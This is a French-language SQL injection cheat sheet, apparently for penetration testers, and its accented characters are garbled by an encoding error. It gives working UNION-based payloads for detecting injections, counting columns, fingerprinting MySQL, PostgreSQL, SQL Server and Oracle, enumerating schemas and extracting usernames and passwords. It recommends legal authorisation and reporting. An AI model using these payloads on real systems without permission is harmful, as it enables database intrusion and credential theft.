üéØ SQL Injection ‚Äì Professional Workflow
1. Tester la pr√©sence d‚Äôune injection

üëâ Ajoute une apostrophe ' apr√®s un param√®tre vuln√©rable dans l‚ÄôURL ou un formulaire.

Exemple :

http://target.com/page.php?id=1'

Signes positifs

Erreur SQL affich√©e :

MySQL : You have an error in your SQL syntax

PostgreSQL : syntax error at or near

SQL Server : Unclosed quotation mark

Oracle : ORA-00933: SQL command not properly ended

Changement du contenu de la page (diff√©rent d‚Äôune valeur ‚Äúnormale‚Äù).

2. D√©terminer le nombre de colonnes

üëâ N√©cessaire pour pr√©parer une injection UNION SELECT.

M√©thodes :

ORDER BY
Teste un par un :

?id=1 ORDER BY 1--
?id=1 ORDER BY 2--
?id=1 ORDER BY 3--
...


Quand tu re√ßois une erreur ‚Üí le nombre de colonnes est juste avant.

UNION NULL
Exemples :

?id=1 UNION SELECT NULL--
?id=1 UNION SELECT NULL,NULL--
?id=1 UNION SELECT NULL,NULL,NULL--


Quand la requ√™te passe ‚Üí tu as trouv√© le bon nombre de colonnes.

3. Identifier la base de donn√©es (fingerprinting)

üëâ Utilise des fonctions sp√©cifiques √† chaque SGBD pour deviner lequel est utilis√©.

DBMS	Fonction/version test	Exemple d‚Äôinjection
MySQL	version()	?id=1 UNION SELECT version(),NULL--
PostgreSQL	current_database()	?id=1 UNION SELECT current_database(),NULL--
SQL Server	@@version	?id=1 UNION SELECT @@version,NULL--
Oracle	banner FROM v$version	?id=1 UNION SELECT banner,NULL FROM v$version--
4. Extraire des informations utiles

Une fois la version identifi√©e, tu peux aller plus loin.

Nom de la base courante

MySQL : database()

PostgreSQL : current_database()

SQL Server : db_name()

Oracle : SELECT ora_database_name FROM dual

Lister les tables

MySQL / PostgreSQL : information_schema.tables

SQL Server : information_schema.tables

Oracle : all_tables

Exemple (MySQL) :

?id=1 UNION SELECT table_name,NULL 
FROM information_schema.tables WHERE table_schema=database()--


Lister les colonnes

?id=1 UNION SELECT column_name,NULL 
FROM information_schema.columns WHERE table_name='users'--


Extraire les donn√©es

?id=1 UNION SELECT username,password FROM users--

5. Bonnes pratiques pro

‚ö†Ô∏è Toujours avec autorisation l√©gale (p√©n√©tration test ou bug bounty).

Documente chaque √©tape dans un rapport clair :

Payload utilis√©

R√©sultat observ√©

Preuve (screenshot Burp/Browser)

Impact + recommandations

Utilise Burp Suite pour r√©p√©ter et affiner les requ√™tes. (R√©f√©rence : Burp Suite SQLi Cheat Sheet).

üöÄ Workflow r√©sum√© (sch√©ma)

Test ' ‚Üí erreur ? ‚úÖ SQLi possible

D√©terminer colonnes (ORDER BY ou UNION NULL)

Identifier DBMS (version()/@@version/etc.)

Enum√©rer sch√©ma (tables ‚Üí colonnes ‚Üí donn√©es)

Rapport et mitigation
